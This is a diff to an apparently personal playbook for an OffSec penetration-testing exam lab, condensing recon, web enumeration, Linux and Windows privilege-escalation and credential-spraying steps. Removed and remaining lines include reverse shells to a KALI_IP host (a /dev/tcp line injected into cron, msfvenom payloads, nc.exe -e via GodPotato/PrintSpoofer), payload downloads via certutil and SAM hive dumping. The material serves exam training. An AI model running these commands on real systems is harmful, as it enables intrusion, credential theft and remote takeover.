@@ -89,6 +89,43 @@ Now proceed to Phase 1 below for your #1 target. As scans finish for other targe
 
 ---
 
+## engagement Default Chain
+
+> [!important] If nothing is weird, this is the order. Every target, every time.
+
+```
+recon.sh → read quick_wins.txt + summary.txt
+  HTTP found? → webenum.sh → read summary.md + quick_wins.txt
+  → exploit for foothold → SHELL
+  → servr.sh → lootr (on target) + escalatr.sh (from Kali)
+  → read lootr summary.txt → act on findings (see Linux_PrivEsc.md / Windows_PrivEsc.md)
+  → any hashes? → crackr.sh -q → sprayr.sh --from-creds      ← CREDENTIAL LOOP
+  → root/SYSTEM? → evidencr.sh IMMEDIATELY → screenshot → submit flag
+```
+
+AD targets follow the same chain but add `adr.sh` the moment you have creds — see Phase 8.
+
+---
+
+> [!danger] The Credential Loop — Your engagement Engine
+> Every time a credential appears from ANY source — lootr, crackr, config file, description field, SNMP, anywhere:
+> 1. `./crackr.sh -q` (if it's a hash)
+> 2. `./sprayr.sh --from-creds` (sprays ALL known creds against ALL known targets)
+> 3. Act on any `Pwn3d!` hits (psexec/wmiexec/evil-winrm → lootr → evidencr → secretsdump → repeat)
+>
+> This loop is the engagement's core engine. A cracked password you don't spray is a wasted password. Run this loop reflexively after every single credential discovery.
+
+---
+
+> [!warning] Stop / Rotate Rules
+> - **30 min** on web enum with no foothold vector → move to a different target.
+> - **2 hours** on any single target with 0 flags → STOP. Switch targets. Fresh eyes beat tunnel vision.
+> - **AD set with assumed-breach creds available?** → This is your highest-ROI path (40 points). Run `adr.sh --quick` → crack → spray → `--chain` → BloodHound BEFORE grinding standalones.
+> - **AD chain + BloodHound complete, no clear path to DA after 90 min?** → Park AD. Collect standalone points. Come back after more creds surface from other boxes.
+> - **T+18h with < 70 pts?** → Stop attacking. Write the report for what you have. Partial credit > 0 credit.
+
+---
+
 ## Phase 1: Recon — `recon.sh`
 
 **When:** First thing. Every target. No exceptions.
@@ -200,69 +237,26 @@ cat $WEBDIR/vhosts/hosts_entries.txt
 
 ### Step 3 — Act on what you find
 
-**Decision on `summary.md` / `quick_wins.txt`:**
+Act on `summary.md`, `quick_wins.txt`, and `hosts_entries.txt` using the decision trees in `webenum_cheatsheet.md` and `Web_App.md`. The most common quick wins:
 
-- **CMS identified (WordPress, Joomla, Drupal, etc.)?**
-  - → `searchsploit wordpress X.Y.Z` (use the exact version).
-  - → WordPress specifically? `wpscan --url http://IP --enumerate u,vp,vt` for users and vulnerable plugins/themes.
-  - → Found a known RCE? → Exploit for foothold → Phase 2.
+| Finding | Immediate Action |
+|---------|-----------------|
+| CMS with version | `searchsploit <cms> X.Y.Z` → exploit for foothold |
+| Login page | Default creds first (`admin:admin`, `admin:password`, app-specific) |
+| `.git` exposed | `git-dumper` → check commit history for creds |
+| `.env` file | `curl` it → DB passwords, API keys → spray everywhere |
+| File upload | Test `.php`/`.aspx`/`.jsp` → webshell |
+| New vhosts | Add to `/etc/hosts` → `./webenum.sh --url http://IP --vhost DOMAIN` → repeat Steps 2-3 |
 
-- **Login page found?**
-  - → Try default creds first: `admin:admin`, `admin:password`, `admin:<blank>`, `root:root`.
-  - → Check if the app name is identifiable → Google `<app> default credentials`.
-  - → None work? → Flag for brute force after you've tried other targets.
-
-- **`.git` directory exposed?**
-  - → `git-dumper http://IP/.git ./git-dump` → `cd git-dump` → `git log --oneline` → `git diff HEAD~5` → look for creds, API keys, config changes in commit history.
-
-- **`.env` file found?**
-  - → `curl http://IP/.env` → usually contains DB passwords, API keys, app secrets. Try those creds everywhere.
-
-- **`401/403` on `/admin`, `/console`, `/manager`, etc.?**
-  - → Flag for auth bypass: try HTTP verb tampering (`curl -X POST`), path traversal (`/admin../`, `//admin`), header injection (`X-Forwarded-For: 127.0.0.1`).
-  - → Try default creds for the specific app (e.g., Tomcat `/manager` → `tomcat:s3cret`).
-
-- **File upload endpoint found?**
-  - → Test if it accepts `.php`, `.aspx`, `.jsp` — upload a webshell. If filtered, try extension bypass (`.php5`, `.phtml`, `.aspx;.jpg`).
-
-- **Nothing interesting in quick_wins?** → Continue to Step 4.
-
-**Decision on `hosts_entries.txt`:**
-
-- **New vhosts found?**
-  - → Add ALL of them to `/etc/hosts`:
-    ```bash
-    echo "IP  target.htb" | sudo tee -a /etc/hosts
-    echo "IP  dev.target.htb" | sudo tee -a /etc/hosts
-    ```
-  - → Re-run webenum for each new vhost:
-    ```bash
-    ./webenum.sh --url http://IP --vhost target.htb
-    ```
-  - → Repeat Steps 2-3 for each vhost's output. Different vhosts frequently serve different apps.
-
-- **No vhosts found?** → Check for domain names in: page source (`curl -s http://IP | grep -i 'href\|src\|domain'`), SSL cert (`openssl s_client -connect IP:443 2>/dev/null | openssl x509 -noout -text | grep -i 'DNS:'`), redirect headers (`curl -Iv http://IP`).
-  - → Found a domain? → Add to `/etc/hosts`, run `./webenum.sh --url http://IP --vhost DOMAIN`.
-  - → Still nothing? → Continue to Step 4.
-
-### Step 4 — Deep mode if standard came up empty
+**Nothing actionable?** → Deep mode, then manual ffuf, then rotate:
 
 ```bash
 ./webenum.sh --url http://IP --deep
-./webenum.sh --url http://IP --deep --vhost target.htb   # if you have a vhost
+# Still nothing after deep? → manual wordlists, different extensions per tech stack
+# >30 min with no foothold vector? → move to a different target
 ```
 
-Deep mode enables recursive fuzzing and parameter discovery. Re-read `summary.md` and `quick_wins.txt` after it finishes — repeat Step 3.
-
-### Step 5 — Still nothing after deep mode
-
-- Try different wordlists manually with `ffuf` or `gobuster`:
-  ```bash
-  ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fc 404
-  ```
-- Try different extensions based on the tech stack (`.php` for Apache, `.aspx` for IIS, `.jsp` for Tomcat).
-- Check for API endpoints: `/api/`, `/v1/`, `/graphql`, `/swagger`, `/docs`.
-- Move to a different target if you've spent >30 min on web enum with no foothold vector.
+Full technique detail for each finding type: see `webenum_cheatsheet.md` and `Web_App.md`.
 
 ---
 
@@ -326,93 +320,28 @@ bash /tmp/lootr.sh
 
 > [!tip] If `wget` fails, try `curl -o /tmp/lootr.sh http://KALI_IP:8080/lootr.sh`. If both fail, the target may have no outbound HTTP — try base64 encoding the script and pasting it, or use a different transfer method (see Phase 4).
 
-**Step 3 — Read output and act on each finding:**
+**Step 3 — Read output and act on findings:**
 
 ```bash
 HOST=$(hostname)
+cat ~/loot/$HOST/summary.txt    # read this FIRST — flags highest-value findings
 ```
 
-**3a — Summary first:**
-```bash
-cat ~/loot/$HOST/summary.txt
-```
-Read the whole thing. It flags the highest-value findings. Continue below to investigate each category.
+**Act on findings in this priority order:**
 
-**3b — Sudo rights:**
-```bash
-cat ~/loot/$HOST/system/sudo_rights.txt
-```
-- **`NOPASSWD` entries found?** → Check each binary against GTFOBins (`https://gtfobins.github.io/`).
-  - Binary is on GTFOBins with a sudo exploit? → Run it. You're root. → Phase 10: `evidencr.sh`.
-  - Binary is NOT on GTFOBins? → Can you abuse it to read/write files? (e.g., `sudo tee`, `sudo cp`, `sudo vi`). If it can write, overwrite `/etc/passwd` with a new root entry.
-- **No `NOPASSWD` entries?** → Continue to 3c.
-- **`sudo: command not found`?** → sudo isn't installed. Skip, continue to 3c.
+| Check | File | If Found | Action |
+|-------|------|----------|--------|
+| Sudo NOPASSWD | `system/sudo_rights.txt` | Binary listed | GTFOBins → exploit → root → Phase 10 |
+| SUID (non-standard) | `files/suid_binaries.txt` | Custom binary | GTFOBins or `strings` for PATH injection |
+| Writable cron | `files/cron_jobs.txt` | Writable script | Inject reverse shell, wait for execution |
+| Shadow hashes | `creds/shadow_hashes.txt` | Hashes present | `./crackr.sh --unshadow` → `su` → `sprayr.sh --from-creds` |
+| SSH keys | `creds/key_*` | Key file | Try unencrypted first → if passphrase → `./crackr.sh -e ssh` |
+| Local-only services | `network/internal_listeners.txt` | 127.0.0.1:PORT | SSH port-forward → investigate |
+| New subnets | `network/reachable_subnets.txt` | Subnet | Note for Phase 9 (pivotr) after rooting |
 
-**3c — SUID binaries:**
-```bash
-cat ~/loot/$HOST/files/suid_binaries.txt
-```
-- **Custom or unusual SUID binaries found?** (anything NOT standard like `su`, `mount`, `ping`, `passwd`) → Check GTFOBins for each one.
-  - Exploitable? → Run the GTFOBins SUID exploit → root → Phase 10.
-  - Not on GTFOBins? → Check if it's a custom binary: `strings /path/to/binary | grep -i pass\|exec\|system\|/bin`. Custom SUID binaries sometimes call other programs without full paths (PATH injection) or have buffer overflows.
-- **Only standard SUID binaries?** → Continue to 3d.
+Full technique detail for each finding type: see `Linux_PrivEsc.md`.
 
-**3d — Cron jobs:**
-```bash
-cat ~/loot/$HOST/files/cron_jobs.txt
-```
-- **Writable cron script found?** → Inject a reverse shell:
-  ```bash
-  echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /path/to/writable_script.sh
-  ```
-  Start Penelope listener, wait for cron execution (check the schedule — could be 1-5 min).
-- **Cron script calls a binary using a relative path?** → PATH hijack: create your own version earlier in PATH.
-- **Wildcard in cron command (e.g., `tar *`)?** → Wildcard injection — research the specific command.
-- **No writable crons?** → Continue to 3e.
-
-**3e — Hashes and keys:**
-```bash
-cat ~/loot/$HOST/creds/shadow_hashes.txt
-ls ~/loot/$HOST/creds/key_*
-```
-- **Shadow hashes found?** → Crack immediately on Kali:
-  ```bash
-  ./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q
-  ```
-  Transfer `/etc/passwd` and `/etc/shadow` to Kali first if not already there.
-  - **Cracked a password?** → Try `su <user>`. If that user has sudo rights, check GTFOBins again for their allowed commands. → Also run `./sprayr.sh --from-creds` to spray it against all other targets.
-  - **Nothing cracked in quick mode?** → Escalate cracking (see Phase 6, Step 4).
-
-- **SSH private key found?** → Try it directly first — don't waste time cracking if it's unencrypted:
-  ```bash
-  chmod 600 ~/loot/$HOST/creds/key_*
-  ssh -i ~/loot/$HOST/creds/key_rsa root@localhost   # try root first
-  ssh -i ~/loot/$HOST/creds/key_rsa user@localhost    # try the owner
-  ```
-  - **Passphrase required?** → Crack it:
-    ```bash
-    ./crackr.sh -e ssh -f key_file -q
-    ```
-  - **Key accepted without passphrase?** → You're in as that user. Check their sudo rights.
-
-- **No hashes, no keys?** → Continue to 3f.
-
-**3f — Internal network:**
-```bash
-cat ~/loot/$HOST/network/internal_listeners.txt
-cat ~/loot/$HOST/network/reachable_subnets.txt
-```
-- **Local-only services found (127.0.0.1:PORT)?** → These are hidden services. Port-forward them back to Kali for investigation:
-  ```bash
-  # If you have SSH access
-  ssh -L 8888:127.0.0.1:PORT user@target
-  # Then browse http://127.0.0.1:8888 from Kali
-  ```
-  Often these are internal web apps, databases, or admin panels with weaker security.
-
-- **New subnets found?** → Note them. After you root this box, you'll use `pivotr.sh` (Phase 9) to reach them.
-
-- **Neither?** → Continue to Phase 5 (escalatr.sh for automated privesc scanning).
+**Nothing in the table?** → Continue to Phase 5 (escalatr.sh for linpeas).
 
 **Quick mode** when you need speed or just specific data:
 ```bash
@@ -439,107 +368,31 @@ powershell -ep bypass -File .\lootr.ps1
 
 > [!tip] If SMB is blocked, fall back to HTTP: `./servr.sh http --port 8080` on Kali, then `certutil -urlcache -f http://KALI_IP:8080/lootr.ps1 C:\Windows\Temp\lootr.ps1` on target. If certutil is blocked, try `powershell -c "iwr -uri http://KALI_IP:8080/lootr.ps1 -outfile C:\Windows\Temp\lootr.ps1"`.
 
-**Step 3 — Read output and act on each finding:**
+**Step 3 — Read output and act on findings:**
 
 ```powershell
 $H = $env:COMPUTERNAME; $R = ".\loot\$H"
+Get-Content "$R\summary.txt"    # read this FIRST
 ```
 
-**3a — Summary first:**
-```powershell
-Get-Content "$R\summary.txt"
-```
+**Act on findings in this priority order:**
 
-**3b — AlwaysInstallElevated (fastest Windows privesc — check this FIRST):**
-```powershell
-Get-Content "$R\files\always_install_elevated.txt"
-```
-- **Both HKLM and HKCU keys = 1?** → Instant SYSTEM. Generate MSI payload and run:
-  ```bash
-  # On Kali:
-  msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f msi -o evil.msi
-  # Serve it: ./servr.sh smb --share tools
-  ```
-  ```powershell
-  # On target:
-  copy \\KALI_IP\tools\evil.msi C:\Windows\Temp\
-  msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
-  ```
-  Catch the shell with `penelope -p 4445 -O` → You're SYSTEM → Phase 10.
-- **One or both keys = 0 or missing?** → Not exploitable. Continue to 3c.
+| Check | File | If Found | Action |
+|-------|------|----------|--------|
+| AlwaysInstallElevated | `files\always_install_elevated.txt` | Both keys = 1 | MSI payload → instant SYSTEM |
+| SeImpersonatePrivilege | `creds\privileges.txt` | Enabled | GodPotato / PrintSpoofer → SYSTEM |
+| SeBackupPrivilege | `creds\privileges.txt` | Enabled | Dump SAM/SYSTEM hives → crack → spray |
+| Autologon creds | `creds\autologon.txt` | Plaintext creds | Spray immediately → psexec if admin |
+| Stored creds (cmdkey) | `creds\cmdkey.txt` | Entries present | `runas /savecred` with reverse shell |
+| Unquoted service paths | `files\unquoted_service_paths.txt` | Writable dir in path | Drop payload binary → restart service |
+| Writable service binaries | `files\writable_service_binaries.txt` | Writable binary | Replace binary → restart service |
+| Local-only services | `network\internal_listeners.txt` | 127.0.0.1:PORT | Port-forward via chisel/pivotr |
 
-**3c — Privileges:**
-```powershell
-Get-Content "$R\creds\privileges.txt"
-```
-- **`SeImpersonatePrivilege` enabled?** → Potato attack. Transfer GodPotato or PrintSpoofer:
-  ```bash
-  # On Kali — serve the binary
-  ./servr.sh smb --share tools
-  ```
-  ```powershell
-  # On target (GodPotato):
-  copy \\KALI_IP\tools\GodPotato-NET4.exe C:\Windows\Temp\
-  C:\Windows\Temp\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
-  # OR PrintSpoofer:
-  copy \\KALI_IP\tools\PrintSpoofer64.exe C:\Windows\Temp\
-  C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
-  ```
-  Catch with Penelope → SYSTEM → Phase 10.
-- **`SeBackupPrivilege` enabled?** → Can copy SAM/SYSTEM hives:
-  ```powershell
-  reg save HKLM\SAM C:\Windows\Temp\SAM
-  reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
-  ```
-  Transfer to Kali → `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` → crack hashes → spray.
-- **No useful privileges?** → Continue to 3d.
-
-**3d — Stored credentials:**
-```powershell
-Get-Content "$R\creds\autologon.txt"
-Get-Content "$R\creds\cmdkey.txt"
-```
-- **Autologon creds found?** → Plaintext credentials in registry. Spray immediately:
-  ```bash
-  ./sprayr.sh -u <user> -p '<password>' -t IP --quick
-  ```
-  If the user is admin on this box → `impacket-psexec` for a SYSTEM shell. If it's a domain user → also try `./sprayr.sh --from-creds` against all targets.
-
-- **Stored credentials in cmdkey?** → Use `runas /savecred`:
-  ```powershell
-  runas /savecred /user:DOMAIN\admin "C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4445"
-  ```
-  Catch with Penelope → you're running as that stored user.
-
-- **Neither?** → Continue to 3e.
-
-**3e — Service-based privesc:**
-```powershell
-Get-Content "$R\files\unquoted_service_paths.txt"
-```
-- **Writable directory in an unquoted service path?** → Drop a malicious binary at the writable location. Name it to match the path parsing (e.g., if path is `C:\Program Files\Vuln App\service.exe`, drop `C:\Program.exe` if `C:\` is writable, or `C:\Program Files\Vuln.exe` if `C:\Program Files\` is writable).
-  ```bash
-  # On Kali — generate payload
-  msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f exe -o Vuln.exe
-  ```
-  Transfer, then restart the service: `sc stop VulnService && sc start VulnService` (or reboot if you can't restart it directly). Catch shell → SYSTEM.
-
-- **No unquoted paths?** → Check for writable service binaries:
-  ```powershell
-  Get-Content "$R\files\writable_service_binaries.txt" 2>$null
-  ```
-  If found → replace the binary with your payload, restart the service.
-
-- **Nothing?** → Continue to Phase 5 (escalatr.sh for winPEAS).
-
-**3f — Internal network (same as Linux):**
-```powershell
-Get-Content "$R\network\internal_listeners.txt"
-```
-- **Local-only services?** → Port-forward back with chisel or pivotr.
-- **New subnets?** → Note for Phase 9 after rooting this box.
+Full technique detail for each finding type: see `Windows_PrivEsc.md`.
 
 > [!warning] Do NOT use `.\lootr.ps1 -Quick` when looking for privesc vectors. Quick mode skips AlwaysInstallElevated, unquoted paths, and DLL hijack checks — the three easiest Windows wins.
+
+**Nothing in the table?** → Continue to Phase 5 (escalatr.sh for winPEAS).
 
 **Quick mode** only when you need speed on non-privesc tasks:
 ```powershell
@@ -598,7 +451,7 @@ Get-Content "$R\network\internal_listeners.txt"
 
 ## Phase 5: Privilege Escalation — `escalatr.sh`
 
-**When:** Run this FROM KALI alongside lootr (Phase 3). It stages linpeas/winPEAS on a file server and optionally parses the output.
+**When:** Run this FROM KALI alongside lootr (Phase 3). It stages linpeas/winPEAS and parses the output. Use it as a **second pass** — lootr gives you the fast wins, escalatr catches what lootr missed.
 
 ### Step 1 — Run from Kali
 
@@ -623,38 +476,18 @@ copy \\KALI_IP\tools\winPEASx64.exe C:\Windows\Temp\
 C:\Windows\Temp\winPEASx64.exe | Tee-Object C:\Windows\Temp\winpeas_output.txt
 ```
 
-### Step 3 — Transfer output back to Kali and parse
+### Step 3 — Parse and read quick-wins
 
 ```bash
 ./escalatr.sh --parse /tmp/linpeas_output.txt
-./escalatr.sh --parse /tmp/winpeas_output.txt --os windows
-```
-
-### Step 4 — Read the quick-wins report
-
-```bash
 cat $TOOLKIT_ROOT/privesc/TARGET_IP/quick-wins.txt
 ```
 
-**Decision — act on findings in priority order:**
+**Decision:** Act on any findings using the same priority tables from Phase 3 (Linux or Windows). The technique detail is in `Linux_PrivEsc.md` and `Windows_PrivEsc.md`.
 
-| Finding | Priority | Action |
-|---------|----------|--------|
-| Shadow hashes | HIGH | `./crackr.sh --unshadow /tmp/passwd /tmp/shadow -q` → then `su <user>` if cracked |
-| SSH private key | HIGH | Try directly first (`ssh -i key user@target`). If passphrase → `./crackr.sh -e ssh -f key -q` |
-| `SeImpersonatePrivilege` | HIGH | GodPotato or PrintSpoofer (see Phase 3 Windows 3c above) |
-| `sudo -l` NOPASSWD binary | HIGH | GTFOBins → exploit → root |
-| `AlwaysInstallElevated` | HIGH | MSI payload → instant SYSTEM (see Phase 3 Windows 3b above) |
-| SUID binary on GTFOBins | MEDIUM | Exploit directly for root |
-| Writable cron script | MEDIUM | Inject reverse shell, wait for execution |
-| Unquoted service path | MEDIUM | Drop binary in writable path, restart service |
-| Writable service binary | MEDIUM | Replace binary, restart service |
-| Internal-only services (127.0.0.1) | LOW | Port-forward back, investigate |
-| Kernel version + known exploit | LAST RESORT | Only try if nothing else works — unreliable and can crash the box |
+**escalatr catches things lootr doesn't:** config files with passwords, writable PATH directories, Docker/LXC group membership (Linux), scheduled tasks with writable scripts (Windows), kernel version + known exploits (last resort — unreliable, can crash the box).
 
-- **Found a high-priority item?** → Exploit it now. If you get root/SYSTEM → Phase 10: `evidencr.sh` immediately.
-- **Nothing in quick-wins.txt?** → Read the full linpeas/winPEAS output manually. Look for things the parser might have missed: config files with passwords, interesting running processes, writable PATH directories, Docker/LXC group membership (Linux), scheduled tasks with writable scripts (Windows).
-- **Truly nothing?** → Check `Stuck_Decision_Tree.md`. Consider whether you missed a web vector (Phase 1b) or whether this box requires pivoting from another compromised host.
+**Nothing from either lootr or escalatr?** → Check `Stuck_Decision_Tree.md`. Consider whether you missed a web vector (Phase 1b) or whether this box requires pivoting from another compromised host.
 
 ---
 
@@ -1226,13 +1059,14 @@ Do this right now, not later. Copy the flag value and submit it in the OffSec en
 
 ## Time Management Checkpoints
 
-| Time Elapsed | If No Flags Yet | Action |
+| Time Elapsed | Condition | Action |
 |---|---|---|
-| T+1h | 0 flags | Re-read all recon output. Run webenum --deep. Check SNMP running_processes.txt. Try default creds manually on every login page. |
-| T+2h | 0 flags | STOP working this target. Move to a different one. Fresh eyes beat tunnel vision. |
-| T+3h | < 2 flags | Prioritize AD set — assumed-breach + adr.sh --chain is the fastest path to 40 points. |
-| T+6h | < 3 flags | Run Stuck_Decision_Tree.md for every target. Re-read ALL lootr/recon output — you missed something. |
-| T+18h | < 70 pts | Stop attacking. Write the report for what you have. Don't lose partial credit chasing points. |
+| T+1h | 0 flags on current target | Re-read all recon output. Run webenum --deep. Check SNMP running_processes.txt. Try default creds manually on every login page. |
+| T+2h | 0 flags on current target | STOP this target. Move to a different one. Fresh eyes beat tunnel vision. |
+| T+3h | < 2 flags total | **AD is your fastest path to 40 points.** If you have assumed-breach creds and haven't started AD yet, start NOW: `adr.sh --quick` → crack → spray → `--chain` → BloodHound. |
+| T+4.5h | AD chain complete, no DA path | Park AD. Collect standalone points first. Come back after more creds surface. |
+| T+6h | < 3 flags total | Run Stuck_Decision_Tree.md for every target. Re-read ALL lootr/recon output — you missed something. |
+| T+18h | < 70 pts | **Stop attacking. Write the report for what you have.** Don't lose partial credit chasing points. |
 
 ---
 
